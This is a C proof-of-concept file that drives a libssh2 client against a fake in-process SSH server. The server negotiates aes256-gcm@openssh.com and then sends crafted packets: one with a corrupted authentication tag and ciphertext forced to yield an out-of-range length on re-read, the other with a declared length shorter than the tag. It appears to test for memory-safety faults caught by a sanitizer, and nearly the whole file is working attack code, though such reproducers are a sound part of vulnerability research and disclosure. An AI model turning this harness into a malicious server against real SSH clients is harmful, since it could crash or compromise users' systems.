/*
 * libssh2 AES-GCM transport PoC.
 *
 * Drives the libssh2 client through the public API against an in-process
 * SSH server implementation.  The server negotiates
 * curve25519-sha256 / ssh-ed25519 / aes256-gcm@openssh.com, completes the
 * key exchange and channel setup, and then sends one crafted
 * aes256-gcm@openssh.com packet which is consumed by the client through
 * libssh2_channel_read().
 *
 * Modes (first argument, default "gcm-badtag"):
 *   gcm-badtag  a well-formed encrypted packet with a corrupted auth tag
 *   gcm-short   a packet whose declared length is smaller than the auth tag
 */

#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include <openssl/evp.h>

#include "libssh2.h"

#define SSH_MSG_SERVICE_REQUEST            5
#define SSH_MSG_SERVICE_ACCEPT             6
#define SSH_MSG_KEXINIT                   20
#define SSH_MSG_NEWKEYS                   21
#define SSH_MSG_KEX_ECDH_INIT             30
#define SSH_MSG_KEX_ECDH_REPLY            31
#define SSH_MSG_CHANNEL_OPEN_CONFIRMATION 91
#define SSH_MSG_CHANNEL_DATA              94
#define SSH_MSG_CHANNEL_CLOSE             97

#define BUF_SIZE 4096
#define GCM_TAG_LEN 16

/* --------------------------------------------------------------------- */
/* small helpers                                                          */
/* --------------------------------------------------------------------- */

static void put_u32(unsigned char *p, uint32_t v)
{
    p[0] = (unsigned char)(v >> 24);
    p[1] = (unsigned char)(v >> 16);
    p[2] = (unsigned char)(v >> 8);
    p[3] = (unsigned char)(v);
}

static uint32_t get_u32(const unsigned char *p)
{
    return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
           ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

static int readn(int fd, void *buf, size_t n)
{
    unsigned char *p = buf;
    while(n > 0) {
        ssize_t r = recv(fd, p, n, 0);
        if(r < 0 && errno == EINTR)
            continue;
        if(r <= 0)
            return -1;
        p += r;
        n -= (size_t)r;
    }
    return 0;
}

static int writen(int fd, const void *buf, size_t n)
{
    const unsigned char *p = buf;
    while(n > 0) {
        ssize_t r = send(fd, p, n, 0);
        if(r < 0 && errno == EINTR)
            continue;
        if(r <= 0)
            return -1;
        p += r;
        n -= (size_t)r;
    }
    return 0;
}

/* growable ssh payload buffer */
struct sbuf {
    unsigned char d[BUF_SIZE];
    size_t len;
};

static void sb_reset(struct sbuf *b)
{
    b->len = 0;
}

static void sb_raw(struct sbuf *b, const void *p, size_t n)
{
    if(b->len + n > sizeof(b->d)) {
        fprintf(stderr, "poc: payload too large\n");
        exit(1);
    }
    memcpy(b->d + b->len, p, n);
    b->len += n;
}

static void sb_u8(struct sbuf *b, unsigned char v)
{
    sb_raw(b, &v, 1);
}

static void sb_u32(struct sbuf *b, uint32_t v)
{
    unsigned char p[4];
    put_u32(p, v);
    sb_raw(b, p, 4);
}

static void sb_str(struct sbuf *b, const void *p, size_t n)
{
    sb_u32(b, (uint32_t)n);
    sb_raw(b, p, n);
}

static void sb_cstr(struct sbuf *b, const char *s)
{
    sb_str(b, s, strlen(s));
}

/* --------------------------------------------------------------------- */
/* unencrypted ssh packet framing                                         */
/* --------------------------------------------------------------------- */

static int send_packet(int fd, const unsigned char *payload, size_t plen)
{
    unsigned char hdr[5];
    unsigned char *wire;
    size_t padlen, total;
    int rc;

    padlen = (8 - ((5 + plen) % 8)) % 8;
    if(padlen < 4)
        padlen += 8;

    total = 4 + 1 + plen + padlen;
    wire = malloc(total);
    if(!wire)
        return -1;

    put_u32(hdr, (uint32_t)(1 + plen + padlen));
    hdr[4] = (unsigned char)padlen;
    memcpy(wire, hdr, 5);
    memcpy(wire + 5, payload, plen);
    memset(wire + 5 + plen, 0, padlen);

    rc = writen(fd, wire, total);
    free(wire);
    return rc;
}

/* reads one unencrypted packet, returns the payload (without padding) */
static int read_packet(int fd, unsigned char *payload, size_t *plen)
{
    unsigned char hdr[4];
    unsigned char *body;
    uint32_t pktlen;
    size_t padlen, paylen;

    if(readn(fd, hdr, 4))
        return -1;
    pktlen = get_u32(hdr);
    if(pktlen < 1 || pktlen > 40000)
        return -1;

    body = malloc(pktlen);
    if(!body)
        return -1;
    if(readn(fd, body, pktlen)) {
        free(body);
        return -1;
    }

    padlen = body[0];
    if(padlen + 1 > pktlen) {
        free(body);
        return -1;
    }
    paylen = pktlen - 1 - padlen;
    if(paylen > BUF_SIZE) {
        free(body);
        return -1;
    }
    memcpy(payload, body + 1, paylen);
    *plen = paylen;
    free(body);
    return 0;
}

static int read_banner(int fd, char *banner, size_t buflen)
{
    size_t n = 0;
    for(;;) {
        char c;
        if(readn(fd, &c, 1))
            return -1;
        if(c == '\n')
            break;
        if(n + 1 >= buflen)
            return -1;
        banner[n++] = c;
    }
    while(n > 0 && (banner[n - 1] == '\r' || banner[n - 1] == '\n'))
        n--;
    banner[n] = '\0';
    return 0;
}

/* consume one encrypted (gcm) client packet; its length field is clear */
static int consume_enc_packet(int fd)
{
    unsigned char hdr[4];
    unsigned char *body;
    uint32_t pktlen;

    if(readn(fd, hdr, 4))
        return -1;
    pktlen = get_u32(hdr);
    if(pktlen < 1 || pktlen > 40000)
        return -1;

    body = malloc(pktlen + GCM_TAG_LEN);
    if(!body)
        return -1;
    if(readn(fd, body, pktlen + GCM_TAG_LEN)) {
        free(body);
        return -1;
    }
    free(body);
    return 0;
}

/* --------------------------------------------------------------------- */
/* server-side aes256-gcm encryption, mirroring libssh2's use of the      */
/* OpenSSL AEAD controls (SET_IV_FIXED at init, IV_GEN per packet)        */
/* --------------------------------------------------------------------- */

struct gcm_server {
    EVP_CIPHER_CTX *ctx;
    const unsigned char *key;
    const unsigned char *iv;
    unsigned pktno;
};

static int gcm_server_init(struct gcm_server *g, const unsigned char *key,
                           const unsigned char *iv)
{
    g->key = key;
    g->iv = iv;
    g->ctx = EVP_CIPHER_CTX_new();
    if(!g->ctx)
        return -1;
    if(EVP_EncryptInit_ex(g->ctx, EVP_aes_256_gcm(), NULL, key, iv) != 1)
        return -1;
    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_AEAD_SET_IV_FIXED, -1,
                           (void *)iv) != 1)
        return -1;
    return 0;
}

/* Sends one encrypted packet.  plaintext = [padlen][payload][padding]. */
static int gcm_server_send(struct gcm_server *g, int fd,
                           const unsigned char *payload, size_t plen,
                           size_t padlen, int corrupt_tag)
{
    unsigned char lbuf[4], tag[GCM_TAG_LEN], lastiv[1];
    unsigned char *pt = NULL, *wire = NULL;
    size_t L;
    int rc = -1;

    if(padlen + 1 + plen > 40000)
        return -1;
    L = 1 + plen + padlen;

    pt = malloc(L);
    wire = malloc(4 + L + GCM_TAG_LEN);
    if(!pt || !wire)
        goto out;

    pt[0] = (unsigned char)padlen;
    memcpy(pt + 1, payload, plen);
    memset(pt + 1 + plen, 0, padlen);
    put_u32(lbuf, (uint32_t)L);

    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_GCM_IV_GEN, 1, lastiv) != 1)
        goto out;
    if(EVP_Cipher(g->ctx, NULL, lbuf, 4) < 0)       /* aad: length field */
        goto out;
    if(EVP_Cipher(g->ctx, wire + 4, pt, (unsigned int)L) < 0)
        goto out;
    if(EVP_Cipher(g->ctx, NULL, NULL, 0) < 0)       /* final */
        goto out;
    if(EVP_CIPHER_CTX_ctrl(g->ctx, EVP_CTRL_GCM_GET_TAG, GCM_TAG_LEN,
                           tag) != 1)
        goto out;

    if(corrupt_tag)
        tag[5] ^= 0x5a;

    memcpy(wire, lbuf, 4);
    memcpy(wire + 4 + L, tag, GCM_TAG_LEN);
    rc = writen(fd, wire, 4 + L + GCM_TAG_LEN);
    if(!rc)
        g->pktno++;

out:
    free(pt);
    free(wire);
    return rc;
}

/* --------------------------------------------------------------------- */
/* key exchange helpers                                                   */
/* --------------------------------------------------------------------- */

static void hash_str(EVP_MD_CTX *ctx, const void *p, size_t n)
{
    unsigned char l[4];
    put_u32(l, (uint32_t)n);
    EVP_DigestUpdate(ctx, l, 4);
    EVP_DigestUpdate(ctx, p, n);
}

/* mpint-wrapped shared secret, as hashed by libssh2 */
static size_t make_k_blob(const unsigned char shared[32], unsigned char *blob)
{
    int start = 0, n, prepend;
    unsigned char *p = blob;

    while(start < 31 && shared[start] == 0)
        start++;
    n = 32 - start;
    prepend = (shared[start] & 0x80) != 0;

    put_u32(p, (uint32_t)(n + prepend));
    p += 4;
    if(prepend)
        *p++ = 0;
    memcpy(p, shared + start, (size_t)n);
    return (size_t)(4 + prepend + n);
}

static void derive_material(const unsigned char *k_blob, size_t k_blob_len,
                            const unsigned char H[32],
                            const unsigned char sid[32], char letter,
                            unsigned char *out, size_t outlen)
{
    size_t done = 0;
    while(done < outlen) {
        EVP_MD_CTX *ctx = EVP_MD_CTX_new();
        unsigned char md[32];
        unsigned int mdlen = 0;
        size_t n;
        if(!ctx)
            exit(1);
        EVP_DigestInit_ex(ctx, EVP_sha256(), NULL);
        EVP_DigestUpdate(ctx, k_blob, k_blob_len);
        EVP_DigestUpdate(ctx, H, 32);
        if(done == 0) {
            EVP_DigestUpdate(ctx, &letter, 1);
            EVP_DigestUpdate(ctx, sid, 32);
        }
        else
            EVP_DigestUpdate(ctx, out, done);
        EVP_DigestFinal_ex(ctx, md, &mdlen);
        EVP_MD_CTX_free(ctx);
        n = outlen - done < 32 ? outlen - done : 32;
        memcpy(out + done, md, n);
        done += n;
    }
}

/* one-shot gcm keystream for a given key/iv (aad does not affect it) */
static int gcm_keystream(const unsigned char *key, const unsigned char *iv,
                         size_t len, unsigned char *ks)
{
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char zeros[64];
    size_t done = 0;
    int rc = 0;

    if(!ctx)
        return -1;
    memset(zeros, 0, sizeof(zeros));
    if(EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, key, iv) != 1) {
        rc = -1;
        goto out;
    }
    while(done < len) {
        size_t n = len - done < sizeof(zeros) ? len - done : sizeof(zeros);
        int outl = 0;
        if(EVP_EncryptUpdate(ctx, ks + done, &outl, zeros,
                             (int)n) != 1 || (size_t)outl != n) {
            rc = -1;
            goto out;
        }
        done += n;
    }
out:
    EVP_CIPHER_CTX_free(ctx);
    return rc;
}

/* --------------------------------------------------------------------- */
/* the fake ssh server                                                    */
/* --------------------------------------------------------------------- */

struct server_ctx {
    int fd;
    int short_mode;
};

static void *server_thread(void *arg)
{
    struct server_ctx *sc = arg;
    int fd = sc->fd;
    const char server_banner[] = "SSH-2.0-libssh2_poc";
    unsigned char payload[BUF_SIZE], I_C[BUF_SIZE], I_S[BUF_SIZE];
    unsigned char Q_C[32], Q_S[32], shared[32], k_blob[40];
    unsigned char K_S[64], H[32], sig[64];
    unsigned char key_s2c[32], iv_s2c[12], ks[32];
    unsigned char ed_seed[32], ed_pub[32];
    char client_banner[256];
    size_t plen, I_C_len, I_S_len, K_S_len, k_blob_len;
    struct sbuf sb;
    EVP_MD_CTX *md = NULL;
    EVP_PKEY *xkey = NULL, *peer = NULL, *edkey = NULL;
    EVP_PKEY_CTX *pctx = NULL;
    unsigned int mdlen = 0;
    size_t len;

    /* banner exchange */
    if(writen(fd, server_banner, sizeof(server_banner) - 1))
        goto fail;
    if(writen(fd, "\r\n", 2))
        goto fail;
    if(read_banner(fd, client_banner, sizeof(client_banner)))
        goto fail;

    /* client kexinit */
    if(read_packet(fd, I_C, &I_C_len) || I_C_len < 17 ||
       I_C[0] != SSH_MSG_KEXINIT)
        goto fail;

    /* server kexinit */
    sb_reset(&sb);
    sb_u8(&sb, SSH_MSG_KEXINIT);
    for(int i = 0; i < 16; i++)        /* cookie */
        sb_u8(&sb, (unsigned char)(0x10 + i));
    sb_cstr(&sb, "curve25519-sha256");
    sb_cstr(&sb, "ssh-ed25519");
    sb_cstr(&sb, "aes256-gcm@openssh.com");
    sb_cstr(&sb, "aes256-gcm@openssh.com");
    sb_cstr(&sb, "hmac-sha2-256");
    sb_cstr(&sb, "hmac-sha2-256");
    sb_cstr(&sb, "none");
    sb_cstr(&sb, "none");
    sb_cstr(&sb, "");
    sb_cstr(&sb, "");
    sb_u8(&sb, 0);                     /* first_kex_packet_follows */
    sb_u32(&sb, 0);                    /* reserved */
    memcpy(I_S, sb.d, sb.len);
    I_S_len = sb.len;
    if(send_packet(fd, I_S, I_S_len))
        goto fail;

    /* client ecdh init */
    if(read_packet(fd, payload, &plen) || plen != 1 + 4 + 32 ||
       payload[0] != SSH_MSG_KEX_ECDH_INIT)
        goto fail;
    memcpy(Q_C, payload + 5, 32);

    /* x25519 keypair + shared secret */
    pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_X25519, NULL);
    if(!pctx || EVP_PKEY_keygen_init(pctx) <= 0 ||
       EVP_PKEY_keygen(pctx, &xkey) <= 0) {
        goto fail;
    }
    EVP_PKEY_CTX_free(pctx);
    pctx = NULL;
    len = 32;
    if(EVP_PKEY_get_raw_public_key(xkey, Q_S, &len) != 1 || len != 32)
        goto fail;
    peer = EVP_PKEY_new_raw_public_key(EVP_PKEY_X25519, NULL, Q_C, 32);
    pctx = EVP_PKEY_CTX_new(xkey, NULL);
    if(!peer || !pctx || EVP_PKEY_derive_init(pctx) <= 0 ||
       EVP_PKEY_derive_set_peer(pctx, peer) <= 0)
        goto fail;
    len = 32;
    if(EVP_PKEY_derive(pctx, shared, &len) <= 0 || len != 32)
        goto fail;
    EVP_PKEY_CTX_free(pctx);
    pctx = NULL;
    EVP_PKEY_free(peer);
    peer = NULL;

    /* ed25519 host key */
    for(int i = 0; i < 32; i++)
        ed_seed[i] = (unsigned char)(0xa0 + i);
    edkey = EVP_PKEY_new_raw_private_key(EVP_PKEY_ED25519, NULL,
                                         ed_seed, 32);
    len = 32;
    if(!edkey || EVP_PKEY_get_raw_public_key(edkey, ed_pub, &len) != 1 ||
       len != 32)
        goto fail;

    sb_reset(&sb);
    sb_cstr(&sb, "ssh-ed25519");
    sb_str(&sb, ed_pub, 32);
    memcpy(K_S, sb.d, sb.len);
    K_S_len = sb.len;

    /* exchange hash */
    k_blob_len = make_k_blob(shared, k_blob);
    md = EVP_MD_CTX_new();
    if(!md)
        goto fail;
    if(EVP_DigestInit_ex(md, EVP_sha256(), NULL) != 1)
        goto fail;
    hash_str(md, client_banner, strlen(client_banner));
    hash_str(md, server_banner, sizeof(server_banner) - 1);
    hash_str(md, I_C, I_C_len);
    hash_str(md, I_S, I_S_len);
    hash_str(md, K_S, K_S_len);
    hash_str(md, Q_C, 32);
    hash_str(md, Q_S, 32);
    EVP_DigestUpdate(md, k_blob, k_blob_len);
    if(EVP_DigestFinal_ex(md, H, &mdlen) != 1 || mdlen != 32)
        goto fail;
    EVP_MD_CTX_free(md);
    md = NULL;

    /* signature over H */
    md = EVP_MD_CTX_new();
    if(!md)
        goto fail;
    len = 64;
    if(EVP_DigestSignInit(md, NULL, NULL, NULL, edkey) != 1 ||
       EVP_DigestSign(md, sig, &len, H, 32) != 1 || len != 64)
        goto fail;
    EVP_MD_CTX_free(md);
    md = NULL;
    EVP_PKEY_free(edkey);
    edkey = NULL;

    /* kex reply: signature blob first, then the packet payload */
    sb_reset(&sb);
    sb_cstr(&sb, "ssh-ed25519");
    sb_str(&sb, sig, 64);
    {
        unsigned char reply[BUF_SIZE];
        size_t rlen = 0;
        reply[rlen++] = SSH_MSG_KEX_ECDH_REPLY;
        put_u32(reply + rlen, (uint32_t)K_S_len);
        memcpy(reply + rlen + 4, K_S, K_S_len);
        rlen += 4 + K_S_len;
        put_u32(reply + rlen, 32);
        memcpy(reply + rlen + 4, Q_S, 32);
        rlen += 4 + 32;
        put_u32(reply + rlen, (uint32_t)sb.len);
        memcpy(reply + rlen + 4, sb.d, sb.len);
        rlen += 4 + sb.len;
        if(send_packet(fd, reply, rlen))
            goto fail;
    }

    /* newkeys */
    {
        unsigned char nk = SSH_MSG_NEWKEYS;
        if(send_packet(fd, &nk, 1))
            goto fail;
    }
    if(read_packet(fd, payload, &plen) || plen != 1 ||
       payload[0] != SSH_MSG_NEWKEYS)
        goto fail;

    /* derive the server-to-client keys exactly like the client does */
    derive_material(k_blob, k_blob_len, H, H, 'B', iv_s2c, 12);
    derive_material(k_blob, k_blob_len, H, H, 'D', key_s2c, 32);

    {
        struct gcm_server g;
        if(gcm_server_init(&g, key_s2c, iv_s2c))
            goto fail;
        g.pktno = 0;

        /* service request (encrypted) from the client */
        if(consume_enc_packet(fd))
            goto fail;

        /* service accept */
        sb_reset(&sb);
        sb_u8(&sb, SSH_MSG_SERVICE_ACCEPT);
        sb_cstr(&sb, "ssh-userauth");
        if(gcm_server_send(&g, fd, sb.d, sb.len, 12, 0))
            goto fail;

        /* channel open (encrypted) from the client */
        if(consume_enc_packet(fd))
            goto fail;

        /* channel open confirmation */
        sb_reset(&sb);
        sb_u8(&sb, SSH_MSG_CHANNEL_OPEN_CONFIRMATION);
        sb_u32(&sb, 0);            /* recipient channel (client side) */
        sb_u32(&sb, 1);            /* sender channel (server side) */
        sb_u32(&sb, 0x200000);     /* initial window size */
        sb_u32(&sb, 0x8000);       /* maximum packet size */
        if(gcm_server_send(&g, fd, sb.d, sb.len, 12, 0))
            goto fail;

        if(sc->short_mode) {
            /* declared length smaller than the auth tag */
            if(gcm_server_send(&g, fd, NULL, 0, 3, 0))
                goto fail;
        }
        else {
            /*
             * A structurally valid channel data packet whose authentication
             * tag is corrupted.  The four ciphertext bytes that follow the
             * first 16-byte block are forced to 0xffffffff so that any
             * re-read of the leftover bytes sees an out-of-range packet
             * length instead of a tiny one.
             */
            unsigned char iv_pkt[12];
            unsigned char data[8];
            memcpy(iv_pkt, iv_s2c, 12);
            iv_pkt[11] = (unsigned char)(iv_pkt[11] + g.pktno);
            if(gcm_keystream(key_s2c, iv_pkt, 22, ks))
                goto fail;
            memset(data, 'A', sizeof(data));
            for(int i = 0; i < 4; i++)
                data[2 + i] = (unsigned char)(ks[12 + i] ^ 0xff);

            sb_reset(&sb);
            sb_u8(&sb, SSH_MSG_CHANNEL_DATA);
            sb_u32(&sb, 0);        /* recipient channel */
            sb_str(&sb, data, sizeof(data));
            if(gcm_server_send(&g, fd, sb.d, sb.len, 4, 1))
                goto fail;
        }

        /* a final valid packet, so the client transport has more data
           buffered behind the crafted one */
        sb_reset(&sb);
        sb_u8(&sb, SSH_MSG_CHANNEL_CLOSE);
        sb_u32(&sb, 0);            /* recipient channel */
        if(gcm_server_send(&g, fd, sb.d, sb.len, 12, 0))
            goto fail;

        EVP_CIPHER_CTX_free(g.ctx);
    }

    /* no more server data; let the client see eof */
    shutdown(fd, SHUT_WR);
    return NULL;

fail:
    fprintf(stderr, "poc: server thread failed\n");
    shutdown(fd, SHUT_RDWR);
    return NULL;
}

/* --------------------------------------------------------------------- */
/* client side                                                            */
/* --------------------------------------------------------------------- */

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "gcm-badtag";
    int debug = argc > 2 && !strcmp(argv[2], "debug");
    int fds[2];
    pthread_t tid;
    struct server_ctx sc;
    LIBSSH2_SESSION *session = NULL;
    LIBSSH2_CHANNEL *channel = NULL;
    char buf[2048];
    ssize_t rc;

    if(strcmp(mode, "gcm-badtag") && strcmp(mode, "gcm-short")) {
        fprintf(stderr, "usage: %s [gcm-badtag|gcm-short] [debug]\n",
                argv[0]);
        return 1;
    }

    if(libssh2_init(0)) {
        fprintf(stderr, "poc: libssh2_init failed\n");
        return 1;
    }

    if(socketpair(AF_UNIX, SOCK_STREAM, 0, fds)) {
        fprintf(stderr, "poc: socketpair failed\n");
        return 1;
    }

    sc.fd = fds[1];
    sc.short_mode = !strcmp(mode, "gcm-short");
    if(pthread_create(&tid, NULL, server_thread, &sc)) {
        fprintf(stderr, "poc: pthread_create failed\n");
        return 1;
    }

    session = libssh2_session_init();
    if(!session) {
        fprintf(stderr, "poc: session init failed\n");
        return 1;
    }
    libssh2_session_set_blocking(session, 1);
    if(debug)
        libssh2_trace(session, ~0);

    if(libssh2_session_handshake(session, fds[0])) {
        fprintf(stderr, "poc: handshake failed: %d\n",
                libssh2_session_last_errno(session));
        goto out;
    }

    channel = libssh2_channel_open_session(session);
    if(!channel) {
        fprintf(stderr, "poc: channel open failed: %d\n",
                libssh2_session_last_errno(session));
        goto out;
    }

    rc = libssh2_channel_read(channel, buf, sizeof(buf));
    fprintf(stderr, "poc: read #1 returned %ld\n", (long)rc);

    rc = libssh2_channel_read(channel, buf, sizeof(buf));
    fprintf(stderr, "poc: read #2 returned %ld\n", (long)rc);

out:
    if(channel)
        libssh2_channel_free(channel);
    if(session)
        libssh2_session_free(session);

    pthread_join(tid, NULL);
    close(fds[0]);
    close(fds[1]);
    libssh2_exit();

    fprintf(stderr, "poc: completed without a sanitizer abort\n");
    return 0;
}
